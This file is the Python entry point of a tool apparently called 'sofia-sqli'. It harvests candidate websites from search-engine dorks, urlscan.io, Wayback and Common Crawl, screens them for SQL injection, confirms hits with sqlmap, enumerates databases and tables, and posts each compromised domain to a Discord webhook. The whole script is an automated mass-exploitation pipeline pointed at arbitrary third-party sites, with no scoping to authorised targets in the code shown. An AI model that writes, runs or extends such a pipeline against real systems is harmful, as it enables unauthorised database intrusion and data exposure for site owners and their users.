#!/usr/bin/env python3
"""sofia-sqli - automated SQL injection discovery and verification.

Pipeline
--------
1. Discovery   - dork Google/Bing/DuckDuckGo + query urlscan.io for candidates.
2. Persist     - append discovered targets to config/targets.txt.
3. Discovery   - normalise targets and discover injectable parameters.
4. Heuristic   - fast pre-screen (error / boolean / time signals).
5. Verify      - confirm with sqlmap and enumerate DBMS + tables.
6. Report      - post a Discord embed: Domain | DBMS+version | 3 tables | location.

Usage
-----
    python main.py                          # full run from config/settings.yaml
    python main.py --only-verify            # skip dork + urlscan
    python main.py --url "http://x/y.php?id=1"
    python main.py -t config/targets.txt --threads 10
    python main.py --no-wayback             # skip Wayback CDX discovery
    python main.py --no-commoncrawl         # skip Common Crawl discovery
    python main.py --no-rank                # keep targets.txt order (no ranking)
    python main.py --no-report              # never touch Discord
    python main.py --dry-run                # discovery only, no sqlmap
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field

import yaml
import requests
from requests.adapters import HTTPAdapter

try:  # urllib3 >= 2 / 1.26 compat
    from urllib3.util.retry import Retry
except ImportError:  # pragma: no cover
    Retry = None  # type: ignore[assignment]

# Ensure project root importable when invoked from elsewhere.
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.crawler import DorkCrawler, smart_dedupe_urls
from core.param_discovery import (
    Target,
    dedupe_targets,
    enrich_target,
    load_targets_from_file,
    parse_target_line,
    rank_targets,
    targets_from_urls,
)
from core.sqli_detector import HeuristicDetector
from core.exploit import SqlmapExploiter
from core.parser import Finding, SqlmapParser
from core.reporter import DiscordReporter
from utils.logger import get_logger, setup_logger

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
_file_lock = threading.Lock()
log = get_logger("sofia-sqli.main")


@dataclass
class Context:
    """Shared, thread-safe-ish pipeline context."""

    settings: dict
    detector: HeuristicDetector
    exploiter: SqlmapExploiter
    parser: SqlmapParser
    reporter: DiscordReporter
    dry_run: bool = False
    no_report: bool = False
    require_heuristic: bool = True
    enumerate_tables: bool = True
    session: requests.Session = field(default_factory=requests.Session)


# --------------------------------------------------------------------- config
def load_settings(path: str) -> dict:
    try:
        with open(path, "r", encoding="utf-8") as fh:
            cfg = yaml.safe_load(fh) or {}
    except FileNotFoundError:
        print(f"[!] settings file not found: {path}", file=sys.stderr)
        sys.exit(2)
    except yaml.YAMLError as exc:
        print(f"[!] invalid YAML in {path}: {exc}", file=sys.stderr)
        sys.exit(2)

    # Environment overrides.
    if os.environ.get("SOFIA_THREADS"):
        cfg.setdefault("general", {})["threads"] = int(os.environ["SOFIA_THREADS"])
    return cfg


# -------------------------------------------------------------------- targets
def persist_targets(path: str, new_targets: list[Target]) -> int:
    """Append newly discovered targets to the targets file (deduped)."""
    existing: set[str] = set()
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as fh:
            for line in fh:
                t = parse_target_line(line)
                if t:
                    existing.add(t.as_line())

    to_add: list[str] = []
    for tgt in new_targets:
        line = tgt.as_line()
        if line not in existing:
            existing.add(line)
            to_add.append(line)

    if not to_add:
        return 0

    with open(path, "a", encoding="utf-8") as fh:
        fh.write("\n# --- discovered by sofia-sqli "
                 f"({time.strftime('%Y-%m-%d %H:%M:%S')}) ---\n")
        fh.write("\n".join(to_add) + "\n")
    return len(to_add)


def build_targets(args, ctx: Context, crawl_targets: list[Target]) -> list[Target]:
    targets: list[Target] = []

    # File targets.
    file_targets = load_targets_from_file(args.targets)
    targets.extend(file_targets)

    # Crawler targets.
    targets.extend(crawl_targets)

    # Ad-hoc CLI target.
    if args.url:
        tgt = parse_target_line(args.url)
        if tgt:
            if args.data:
                tgt.method = "POST"
                tgt.data = args.data
                # Re-derive params now that a POST body exists.
                tgt.params = [k for k, _ in tgt.param_pairs()]
            targets.append(tgt)
        else:
            print(f"[!] could not parse --url value: {args.url}", file=sys.stderr)

    targets = dedupe_targets(targets)

    # Rank targets so the most SQLi-promising ones are processed (and kept
    # after the max_targets cut) first. Disable via --no-rank or settings.
    if (bool(ctx.settings.get("general", {}).get("rank_targets", True))
            and not args.no_rank):
        targets = rank_targets(targets)
        if targets:
            log.info("Targets ranked by SQLi promise "
                     "(top score %d: %s)", targets[0].score, targets[0].url)

    max_targets = int(ctx.settings.get("general", {}).get("max_targets", 0) or 0)
    if max_targets and len(targets) > max_targets:
        log.info("Limiting to %d targets (max_targets)", max_targets)
        targets = targets[:max_targets]
    return targets


# ------------------------------------------------------------------- pipeline
def process_target(target: Target, ctx: Context) -> Finding | None:
    """Run the full per-target pipeline. Returns a Finding when reportable."""
    log.info("=== Target: %s [%s] ===", target.url, target.method)

    # 3. Parameter discovery (config: param_discovery trong settings.yaml).
    pd_cfg = dict(ctx.settings.get("param_discovery", {}) or {})
    gen_timeout = float(ctx.settings.get("general", {}).get("timeout", 20))
    # crawl_timeout = 0 -> dung general.timeout.
    crawl_timeout = float(pd_cfg.get("crawl_timeout", 0) or 0) or gen_timeout
    enrich_target(target, session=ctx.session, timeout=crawl_timeout, cfg=pd_cfg)
    if not target.params:
        log.info("No parameters found for %s - skipped", target.url)
        return None
    log.info("Candidate params: %s", ", ".join(target.params[:12]))

    if ctx.dry_run:
        log.info("[dry-run] would run sqlmap on %s", target.url)
        return None

    # 4. Heuristic pre-screen.
    detector = ctx.detector
    heuristic_reason = ""
    if ctx.require_heuristic:
        det = detector.check(target)
        heuristic_reason = det.best_reason()
        if not det.hit and not det.blocked:
            log.info("No heuristic signal for %s (%s) - skipped before sqlmap",
                     target.url, heuristic_reason)
            return None
        log.info("Heuristic signal for %s: %s", target.url, heuristic_reason)

    if not ctx.exploiter.available():
        log.error("sqlmap unavailable - cannot verify %s", target.url)
        return None

    # 5a. sqlmap verification + database enumeration.
    run = ctx.exploiter.run(target, phase="detect")
    finding = ctx.parser.parse_run(run, target)
    finding.heuristic_reason = heuristic_reason

    if not finding.vulnerable:
        log.info("sqlmap: %s NOT injectable", target.url)
        return finding

    log.info("CONFIRMED injection on %s: %s", target.domain, finding.dbms_display())

    # 5b. Table enumeration for the report's "3 tables" field.
    if ctx.enumerate_tables and not finding.top_tables(3):
        dbs = finding.non_system_databases() or finding.databases
        target_dbs = [finding.current_db] if finding.current_db else dbs
        # Fall back to the current database (or None = sqlmap default) when the
        # DBMS exposes no database list (e.g. SQLite).
        if not any(target_dbs):
            target_dbs = [None]
        for db in target_dbs[:2]:
            log.info("Enumerating tables of database '%s'", db or "(current)")
            trun = ctx.exploiter.run(target, phase="tables", database=db)
            tfinding = ctx.parser.parse_run(trun, target)
            finding.tables_by_db.update(tfinding.tables_by_db)
            finding.evidence_files.extend(
                f for f in tfinding.evidence_files if f not in finding.evidence_files)
            if finding.top_tables(3):
                break

    return finding


def save_result(finding: Finding, output_dir: str) -> str:
    os.makedirs(output_dir, exist_ok=True)
    name = "".join(c if c.isalnum() or c in "._-" else "_" for c in finding.domain) or "target"
    # Include a short, stable hash of the full request so distinct targets that
    # share a host never overwrite each other's evidence file.
    sig = f"{finding.target.method}:{finding.target.url}:{finding.target.data}"
    digest = hashlib.sha1(sig.encode("utf-8")).hexdigest()[:6]
    path = os.path.join(output_dir, f"{name}_{digest}_finding.json")
    data = {
        "domain": finding.domain,
        "url": finding.target.url,
        "method": finding.target.method,
        "vulnerable": finding.vulnerable,
        "dbms": finding.dbms,
        "dbms_version": finding.dbms_version,
        "dbms_display": finding.dbms_display(),
        "os": finding.os,
        "web_app": finding.web_app,
        "current_db": finding.current_db,
        "current_user": finding.current_user,
        "databases": finding.databases,
        "tables": finding.top_tables(3),
        "tables_by_db": finding.tables_by_db,
        "injection_location": finding.injection_location(),
        "injection_points": [
            {"parameter": p.parameter, "place": p.place,
             "techniques": p.technique_summary, "payloads": p.payloads}
            for p in finding.injection_points
        ],
        "payloads": finding.payloads,
        "report_line": finding.report_line(),
        "heuristic_reason": finding.heuristic_reason,
        "note": finding.note,
        "evidence_files": finding.evidence_files,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S"),
    }
    with _file_lock:
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2, ensure_ascii=False)
    return path


def _make_urllib3_retries(settings: dict):
    """Transport-level retry for connection/reset errors (status retries are
    handled at the application layer so 429/503 can back off with jitter)."""
    if Retry is None:
        return 0
    retries = int(settings.get("general", {}).get("retries", 3) or 3)
    try:
        return Retry(total=retries, connect=retries, read=retries,
                     status=0, backoff_factor=0.5,
                     allowed_methods=None)  # retry on any method (idempotent GETs)
    except TypeError:  # older urllib3 without allowed_methods
        return Retry(total=retries, connect=retries, read=retries,
                     status=0, backoff_factor=0.5)


# ----------------------------------------------------------------------- main
def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="sofia-sqli",
        description="Automated SQLi discovery (dork + urlscan.io) and sqlmap verification.",
    )
    p.add_argument("-c", "--config", default=os.path.join(BASE_DIR, "config", "settings.yaml"),
                   help="Path to settings.yaml")
    p.add_argument("-t", "--targets", default=os.path.join(BASE_DIR, "config", "targets.txt"),
                   help="Path to targets.txt")
    p.add_argument("--url", help="Ad-hoc single target URL (overrides/extends file)")
    p.add_argument("--data", help="POST body for --url (k=v&k2=v2)")
    p.add_argument("--threads", type=int, help="Override worker thread count")
    p.add_argument("--webhook", help="Override Discord webhook URL")
    p.add_argument("--only-verify", action="store_true",
                   help="Skip dork + urlscan; verify only existing targets")
    p.add_argument("--no-dork", action="store_true", help="Skip dork search only")
    p.add_argument("--no-urlscan", action="store_true", help="Skip urlscan.io only")
    p.add_argument("--no-wayback", action="store_true",
                   help="Skip Wayback Machine CDX discovery")
    p.add_argument("--no-commoncrawl", action="store_true",
                   help="Skip Common Crawl discovery")
    p.add_argument("--no-rank", action="store_true",
                   help="Do not rank targets (keep targets.txt order)")
    p.add_argument("--no-smart-dedupe", action="store_true",
                   help="Keep value-variant duplicates of the same endpoint")
    p.add_argument("--force-sqlmap", action="store_true",
                   help="Run sqlmap even without a heuristic signal")
    p.add_argument("--no-tables", action="store_true", help="Do not enumerate tables")
    p.add_argument("--no-report", action="store_true", help="Never post to Discord")
    p.add_argument("--dry-run", action="store_true", help="Discovery only, no sqlmap")
    p.add_argument("-v", "--verbose", action="store_true", help="DEBUG logging")
    return p.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    settings = load_settings(args.config)

    log_cfg = settings.get("logging", {}) or {}
    level = "DEBUG" if args.verbose else log_cfg.get("level", "INFO")
    log_file = log_cfg.get("file")
    if log_file and not os.path.isabs(log_file):
        log_file = os.path.join(BASE_DIR, log_file)
    setup_logger(level=level, log_file=log_file)

    if args.webhook:
        settings.setdefault("discord", {})["webhook_url"] = args.webhook
    if args.threads:
        settings.setdefault("general", {})["threads"] = args.threads

    output_dir = settings.get("general", {}).get("output_dir", "results")
    if not os.path.isabs(output_dir):
        output_dir = os.path.join(BASE_DIR, output_dir)

    session = requests.Session()
    # Connection pooling: the shared session is used concurrently by many
    # worker threads; a small default HTTPAdapter pool serialises connections
    # and causes spurious timeouts under load.
    _threads_cfg = int(settings.get("general", {}).get("threads", 5) or 5)
    _disc_cfg = int(settings.get("general", {}).get("discovery_threads",
                                                   _threads_cfg) or _threads_cfg)
    _pool = max(10, _threads_cfg + _disc_cfg)
    pool_adapter = HTTPAdapter(pool_connections=_pool, pool_maxsize=_pool * 2,
                               max_retries=_make_urllib3_retries(settings))
    session.mount("http://", pool_adapter)
    session.mount("https://", pool_adapter)

    ctx = Context(
        settings=settings,
        detector=HeuristicDetector(settings, session=session),
        exploiter=SqlmapExploiter(settings, output_dir=output_dir),
        parser=SqlmapParser(),
        reporter=DiscordReporter(settings, session=session),
        dry_run=args.dry_run,
        no_report=args.no_report,
        require_heuristic=not args.force_sqlmap,
        enumerate_tables=not args.no_tables,
        session=session,
    )

    # ---------------------------------------------------------- 1. Discovery
    # Each source (dork/urlscan/wayback/commoncrawl) runs in its own thread
    # with its own rate limiter, and a crash in one source can never take
    # down the whole run. Sources can still be disabled individually.
    crawl_targets: list[Target] = []
    if not args.only_verify:
        crawler = DorkCrawler(settings, session=session)
        sources: list[tuple[str, object]] = []
        if not args.no_dork:
            sources.append(("dork", crawler.run_dorks))
        if not args.no_urlscan:
            sources.append(("urlscan", crawler.run_urlscan))
        if not args.no_wayback:
            sources.append(("wayback", crawler.run_wayback))
        if not args.no_commoncrawl:
            sources.append(("commoncrawl", crawler.run_commoncrawl))

        def _run_source(name: str, fn) -> list[str]:
            try:
                return list(fn().urls)
            except Exception as exc:  # noqa: BLE001 - isolate source failures
                log.error("Discovery source '%s' crashed (isolated): %s", name, exc,
                          exc_info=args.verbose)
                return []

        if not sources:
            log.warning("All discovery sources disabled - relying on targets.txt only")
            unique = []
        elif len(sources) == 1:
            name, fn = sources[0]
            unique = _run_source(name, fn)
        else:
            with ThreadPoolExecutor(max_workers=len(sources),
                                    thread_name_prefix="disc") as dpool:
                futs = {dpool.submit(_run_source, n, fn): n for n, fn in sources}
                disc: list[str] = []
                for fut in as_completed(futs):
                    disc.extend(fut.result())
            # Global dedupe.
            seen: set[str] = set()
            unique = []
            for u in disc:
                if u not in seen:
                    seen.add(u)
                    unique.append(u)

        # Collapse value-only variants (id=1 vs id=2 of the same endpoint) so
        # the sqlmap budget is spent on distinct sinks. Toggleable in settings.
        if (unique
                and bool(settings.get("general", {}).get("smart_dedupe", True))
                and not args.no_smart_dedupe):
            before = len(unique)
            unique = smart_dedupe_urls(unique)
            if before != len(unique):
                log.info("smart-dedupe: %d candidates -> %d unique sinks",
                         before, len(unique))

        crawl_targets = targets_from_urls(unique, source="crawler")

        # ------------------------------------------------- 2. Persist targets
        if crawl_targets and not args.dry_run:
            added = persist_targets(args.targets, crawl_targets)
            log.info("Persisted %d new targets to %s", added, args.targets)

    # ------------------------------------------------------ 3. Build targets
    targets = build_targets(args, ctx, crawl_targets)
    if not targets:
        log.warning("No targets to process. Add URLs to %s or enable dork/urlscan.",
                    args.targets)
        if ctx.reporter.enabled and not ctx.no_report:
            ctx.reporter.send_text("sofia-sqli: no targets to process.")
        return 1

    log.info("Processing %d target(s) with %d worker(s)",
             len(targets), int(settings.get("general", {}).get("threads", 5)))

    # --------------------------------------------------------- 4-6. Pipeline
    started = time.time()
    findings: list[Finding] = []
    vuln: list[Finding] = []
    threads = max(1, int(settings.get("general", {}).get("threads", 5)))

    with ThreadPoolExecutor(max_workers=threads, thread_name_prefix="worker") as pool:
        futures = {pool.submit(process_target, t, ctx): t for t in targets}
        for fut in as_completed(futures):
            tgt = futures[fut]
            try:
                finding = fut.result()
            except Exception as exc:  # noqa: BLE001
                log.error("Target %s crashed: %s", tgt.url, exc, exc_info=args.verbose)
                continue
            if finding is None:
                continue
            findings.append(finding)
            save_result(finding, output_dir)
            if finding.vulnerable:
                vuln.append(finding)
                print(f"\n[VULN] {finding.report_line()}\n")
                if not args.no_report and not ctx.dry_run:
                    ctx.reporter.send_finding(finding)

    ended = time.time()

    # ------------------------------------------------------------ summary
    log.info("Run complete: %d scanned, %d vulnerable, %.1fs",
             len(findings), len(vuln), ended - started)
    if vuln:
        print("\n===== SUMMARY (Domain | DBMS+version | Tables | Location) =====")
        for f in vuln:
            print(f.report_line())
        print("=============================================================")

    if not args.no_report and not ctx.dry_run and ctx.reporter.enabled:
        ctx.reporter.send_summary(len(findings), vuln, started, ended)

    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[!] interrupted by user", file=sys.stderr)
        raise SystemExit(130)
